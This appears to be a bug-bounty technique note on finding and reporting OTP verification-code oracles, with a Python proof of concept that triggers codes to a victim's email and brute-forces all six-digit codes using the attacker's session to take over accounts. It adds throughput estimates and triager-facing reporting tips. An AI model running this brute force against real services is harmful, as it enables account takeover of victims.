# OTP/Verification Code Oracle Brute-Force

## Pattern

When an endpoint validates OTP/verification codes, test whether **authenticated vs unauthenticated** contexts produce different responses for correct vs incorrect codes. A differential response = oracle = brute-force viable.

## Technique

### Step 1: Identify the oracle

Test the same endpoint with correct and incorrect codes in both contexts:

| Code | Context | Expected if vulnerable |
|------|---------|----------------------|
| Wrong | Unauthenticated | Generic error (e.g. 1703) |
| Correct | Unauthenticated | Same generic error (no oracle) |
| Wrong | Authenticated (attacker session) | Generic error (e.g. 1703) |
| Correct | Authenticated (attacker session) | **Different error code** (oracle!) |

The triager trap: if you only test unauthenticated, both correct and wrong codes may return the same response. The triager will argue "can't distinguish valid from invalid." But the real attack uses the attacker's own authenticated session.

### Step 2: Confirm no rate limiting

Compare the target endpoint against a similar "secure" endpoint:

```python
# Vulnerable endpoint: no rate limit
for i in range(20):
    r = session.post("/passport/email/bind/", data={"code": f"{i:06d}"})
    # All return same error_code (no blocking)

# Secure endpoint: rate limited
r = session.post("/passport/email/verify/", data={"code": "000001"})
# Returns "Maximum attempts reached" after 1-3 tries
```

### Step 3: Attack flow

```
1. Attacker triggers send_code to victim's email/phone (often unauthenticated)
2. Attacker brute-forces the bind/verify endpoint WITH OWN SESSION
3. Oracle: response differs when code is correct
4. Correct code → action completes (email/phone bound to attacker)
5. Attacker resets victim's password → ATO
```

### Key Insight

The vulnerability is NOT just "no rate limit." It's the combination of:
1. **Unauthenticated code triggering** — attacker can send code to any email
2. **Oracle in authenticated context** — different error codes for correct vs wrong
3. **No rate limiting** — unlimited attempts without blocking
4. **Missing auth gate** — endpoint processes requests it shouldn't (compare with sibling endpoints that correctly enforce auth)

### PoC Structure

```python
import requests

def send_code(victim_email):
    """Trigger code to victim (no auth required)"""
    r = requests.post(f"{TARGET}/send_code", data={"email": victim_email})
    return r.json()

def try_code(victim_email, code, attacker_cookie):
    """Test code with attacker's session (oracle)"""
    r = requests.post(f"{TARGET}/bind",
                      headers={"Cookie": attacker_cookie},
                      data={"email": victim_email, "code": code})
    error_code = r.json().get("data", {}).get("error_code")
    return error_code

def bruteforce(victim_email, attacker_cookie):
    """Brute-force using oracle"""
    for i in range(1000000):
        code = f"{i:06d}"
        ec = try_code(victim_email, code, attacker_cookie)
        if ec != WRONG_CODE_ERROR:  # Oracle hit
            return code
    return None
```

### Reporting Tips

- Always compare the vulnerable endpoint with a "secure" sibling (e.g. `/bind/` vs `/verify/`)
- Show the differential response clearly: correct code → error X, wrong code → error Y
- Calculate feasibility: code_space / (threads × rate) = time to crack
- For 6-digit codes: 1M combinations, 100 threads @ 2 req/s = ~1.4 hours
- Note: if code TTL is short (5 min), attacker needs ~3,333 req/s (achievable with distributed infra)

### Pitfalls

- **Test with FRESH code** — expired codes return the same error as wrong codes
- **Test authenticated context** — unauthenticated may show no oracle (triager will reject)
- **The first request may differ** — some endpoints return a different error on the very first attempt (initialization), test from the 2nd request onward
- **"Email already bound" is still an oracle** — even if the bind doesn't complete (email already in use), the different error code proves the server validated the code first
